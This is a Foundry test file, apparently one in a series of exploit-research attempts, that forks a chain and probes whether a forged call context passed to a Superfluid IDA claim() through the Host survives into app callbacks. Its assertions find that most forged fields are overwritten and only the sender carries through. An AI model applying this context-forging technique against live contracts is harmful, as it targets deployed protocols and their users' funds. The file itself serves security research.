// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
}

interface ISETH is ISuperToken {
    function upgradeByETH() external payable;
}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function isApp(address app) external view returns (bool);

    function getAppManifest(address app) external view returns (bool isSuperApp, bool isJailed, uint256 noopMask);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(
        ISuperToken token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        ISuperToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        ISuperToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

/// @title Attempt11
/// @notice Hypothesis: the newly available fork Host source closes the
///         attacker-controlled `appCredit*` / `appAddress` branch even before a
///         callback executes. On the real Host path:
///         1. `claim()` still echoes a forged ctx at the top level,
///         2. but `AgreementLibrary.createCallbackInputs()` leaves
///            `appCreditGranted/appCreditUsed` at zero for `claim()`,
///         3. `Host.appCallbackPush()` overwrites `appAddress`,
///            `appCreditGranted`, `appCreditUsed`, and `appCreditToken`,
///         4. and `Host.callAgreementWithContext()` swaps `msgSender` to the
///            publisher app during sub-operations.
///
///         So the only forged field that survives into a bona fide callback is
///         the pre-callback `msgSender`, and only publisher-side app logic can
///         observe it.
contract Attempt11 is Test {
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant FORGED_MSG_SENDER = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
    address constant FORGED_APP_ADDRESS = 0x1111111111111111111111111111111111111111;
    address constant PUBLISHER_APP = 0x029cE4720F852520BBB95514B33a47c9864567a4;

    uint256 constant FORK_BLOCK = 27_039_967;
    uint32 constant INDEX_ID = 55_110_001;

    ISuperfluidHost constant HOST = ISuperfluidHost(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISETH constant MATICX = ISETH(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
    ISuperToken constant USDCX = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);
        vm.deal(ATTACKER, 10 ether);

        vm.label(ATTACKER, "Attacker");
        vm.label(FORGED_MSG_SENDER, "ForgedMsgSender");
        vm.label(FORGED_APP_ADDRESS, "ForgedAppAddress");
        vm.label(PUBLISHER_APP, "PublisherApp");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
        vm.label(address(MATICX), "MATICx");
        vm.label(address(USDCX), "USDCx");
    }

    function test_claim_callback_field_clobbering_is_source_backed() public {
        uint256 nativeBefore = ATTACKER.balance;
        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);

        (bool isApp, bool isJailed, uint256 noopMask) = HOST.getAppManifest(PUBLISHER_APP);
        console.log("[publisher app] isApp:", isApp);
        console.log("[publisher app] isJailed:", isJailed);
        console.log("[publisher app] noopMask:", noopMask);
        assertTrue(HOST.isApp(PUBLISHER_APP), "publisher app should still be registered on the fork");
        assertTrue(isApp, "manifest should report a SuperApp");
        assertFalse(isJailed, "publisher app should remain live for this probe");

        _seedClaim();

        bytes memory forgedCtx = _buildForgedClaimContext();
        ContextUtils.Context memory forged = ContextUtils.decodeContext(forgedCtx);

        uint256 tokenBefore = MATICX.balanceOf(ATTACKER);
        (,,, uint256 pendingBefore) = IDA.getSubscription(MATICX, ATTACKER, INDEX_ID, ATTACKER);

        vm.prank(ATTACKER);
        (bool ok, bytes memory wrappedRet) = _callAgreementWithTrailingBytes(
            IDA,
            abi.encodeCall(IDA.claim, (MATICX, ATTACKER, INDEX_ID, ATTACKER, forgedCtx))
        );

        uint256 tokenAfter = MATICX.balanceOf(ATTACKER);
        (,,, uint256 pendingAfter) = IDA.getSubscription(MATICX, ATTACKER, INDEX_ID, ATTACKER);
        bytes memory returnedCtxBytes = _decodeInnerCtx(wrappedRet);
        ContextUtils.Context memory returnedCtx = ContextUtils.decodeContext(returnedCtxBytes);

        console.log("[claim control] ok:", ok);
        console.log("[claim control] token delta:", tokenAfter - tokenBefore);
        console.log("[claim control] pending before:", pendingBefore);
        console.log("[claim control] pending after:", pendingAfter);
        console.log("[claim control] returned msgSender:", returnedCtx.msgSender);
        console.log("[claim control] returned appAddress:", returnedCtx.appAddress);
        console.log("[claim control] returned appCreditGranted:", returnedCtx.appCreditGranted);
        console.logInt(returnedCtx.appCreditUsed);
        console.log("[claim control] returned appCreditToken:", returnedCtx.appCreditToken);

        bytes memory callbackCtxBytes = ContextUtils.encodeContext(
            _simulateClaimCallbackPush(forgedCtx, PUBLISHER_APP, address(MATICX))
        );
        ContextUtils.Context memory callbackCtx = ContextUtils.decodeContext(callbackCtxBytes);
        ContextUtils.Context memory nestedCtx = _simulateCallAgreementWithContextNested(callbackCtxBytes, hex"c0ffee");
        ContextUtils.Context memory restoredCtx = _simulateCallAgreementWithContextRestore(callbackCtxBytes, hex"c0ffee");

        console.log("[simulated callback] msgSender:", callbackCtx.msgSender);
        console.log("[simulated callback] callType:", uint256(callbackCtx.callType));
        console.log("[simulated callback] appLevel:", uint256(callbackCtx.appCallbackLevel));
        console.log("[simulated callback] appAddress:", callbackCtx.appAddress);
        console.log("[simulated callback] appCreditGranted:", callbackCtx.appCreditGranted);
        console.logInt(callbackCtx.appCreditUsed);
        console.log("[simulated callback] appCreditToken:", callbackCtx.appCreditToken);

        console.log("[nested sub-op] msgSender:", nestedCtx.msgSender);
        console.log("[nested sub-op] appAddress:", nestedCtx.appAddress);
        console.log("[restored post-sub-op] msgSender:", restoredCtx.msgSender);

        assertTrue(ok, "forged trailing claim should remain the live control");
        assertEq(tokenAfter - tokenBefore, 1, "control claim should still materialize one wei");
        assertEq(pendingBefore, 1, "control claim should start with pending distribution");
        assertEq(pendingAfter, 0, "control claim should consume pending distribution");

        assertEq(returnedCtx.msgSender, forged.msgSender, "top-level claim should still echo forged msgSender");
        assertEq(returnedCtx.appAddress, forged.appAddress, "top-level claim should still echo forged appAddress");
        assertEq(
            returnedCtx.appCreditGranted,
            forged.appCreditGranted,
            "top-level claim should still echo forged appCreditGranted"
        );
        assertEq(
            returnedCtx.appCreditToken,
            forged.appCreditToken,
            "top-level claim should still echo forged appCreditToken"
        );
        assertEq(returnedCtx.appCreditUsed, forged.appCreditUsed, "top-level claim should still echo forged appCreditUsed");

        assertEq(callbackCtx.msgSender, forged.msgSender, "callback frame should preserve the pre-callback msgSender");
        assertEq(callbackCtx.callType, ContextUtils.CALL_TYPE_APP_CALLBACK, "callback frame should force APP_CALLBACK");
        assertEq(callbackCtx.appCallbackLevel, forged.appCallbackLevel + 1, "callback frame should increment app level");
        assertEq(callbackCtx.appAddress, PUBLISHER_APP, "callback frame should overwrite appAddress with publisher app");
        assertEq(callbackCtx.appCreditGranted, 0, "claim callback should grant zero app credit");
        assertEq(callbackCtx.appCreditUsed, 0, "claim callback should start with zero app credit used");
        assertEq(callbackCtx.appCreditToken, address(MATICX), "callback frame should overwrite the credit token");

        assertEq(nestedCtx.msgSender, PUBLISHER_APP, "nested host sub-op should see the publisher app as msgSender");
        assertEq(restoredCtx.msgSender, forged.msgSender, "host should restore the old forged sender after the sub-op");

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker native:", nativeAfter);
        console.logInt(int256(nativeAfter) - int256(nativeBefore));
    }

    function _seedClaim() internal {
        vm.prank(ATTACKER);
        MATICX.upgradeByETH{value: 1 wei}();

        vm.startPrank(ATTACKER);
        _callAgreementOrRevert(IDA, abi.encodeCall(IDA.createIndex, (MATICX, INDEX_ID, new bytes(0))), "createIndex");
        _callAgreementOrRevert(
            IDA,
            abi.encodeCall(IDA.updateSubscription, (MATICX, INDEX_ID, ATTACKER, uint128(1), new bytes(0))),
            "updateSubscription"
        );
        _callAgreementOrRevert(IDA, abi.encodeCall(IDA.updateIndex, (MATICX, INDEX_ID, uint128(1), new bytes(0))), "updateIndex");
        vm.stopPrank();
    }

    function _buildForgedClaimContext() internal view returns (bytes memory) {
        ContextUtils.Context memory context = ContextUtils.buildContext(
            FORGED_MSG_SENDER,
            IDA.claim.selector,
            hex"deadbeef"
        );
        context.appCreditGranted = type(uint128).max;
        context.appCreditUsed = -123;
        context.appAddress = FORGED_APP_ADDRESS;
        context.appCreditToken = address(USDCX);
        return ContextUtils.encodeContext(context);
    }

    function _simulateClaimCallbackPush(
        bytes memory ctx,
        address app,
        address appCreditToken
    ) internal pure returns (ContextUtils.Context memory context) {
        context = ContextUtils.decodeContext(ctx);
        context.appCallbackLevel += 1;
        context.callType = ContextUtils.CALL_TYPE_APP_CALLBACK;
        context.appCreditGranted = 0;
        context.appCreditWantedDeprecated = 0;
        context.appCreditUsed = 0;
        context.appAddress = app;
        context.appCreditToken = appCreditToken;
    }

    function _simulateCallAgreementWithContextNested(
        bytes memory callbackCtxBytes,
        bytes memory userData
    ) internal pure returns (ContextUtils.Context memory nestedCtx) {
        nestedCtx = ContextUtils.decodeContext(callbackCtxBytes);
        nestedCtx.msgSender = nestedCtx.appAddress;
        nestedCtx.userData = userData;
    }

    function _simulateCallAgreementWithContextRestore(
        bytes memory callbackCtxBytes,
        bytes memory userData
    ) internal pure returns (ContextUtils.Context memory restoredCtx) {
        restoredCtx = _simulateCallAgreementWithContextNested(callbackCtxBytes, userData);
        restoredCtx.msgSender = ContextUtils.decodeContext(callbackCtxBytes).msgSender;
    }

    function _callAgreementOrRevert(
        ISuperAgreement agreement,
        bytes memory inner,
        string memory step
    ) internal {
        (bool ok, bytes memory ret) = _callAgreementRaw(agreement, inner);
        require(ok, string.concat(step, ": ", _decodeRevert(ret)));
    }

    function _callAgreementRaw(
        ISuperAgreement agreement,
        bytes memory inner
    ) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (agreement, inner, new bytes(0))));
    }

    function _callAgreementWithTrailingBytes(
        ISuperAgreement agreement,
        bytes memory inner
    ) internal returns (bool ok, bytes memory ret) {
        return _callAgreementRaw(agreement, abi.encodePacked(inner, abi.encode(new bytes(0))));
    }

    function _decodeInnerCtx(bytes memory wrappedReturn) internal pure returns (bytes memory) {
        bytes memory agreementReturn = abi.decode(wrappedReturn, (bytes));
        return agreementReturn.length == 0 ? bytes("") : abi.decode(agreementReturn, (bytes));
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) return "silent revert";
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
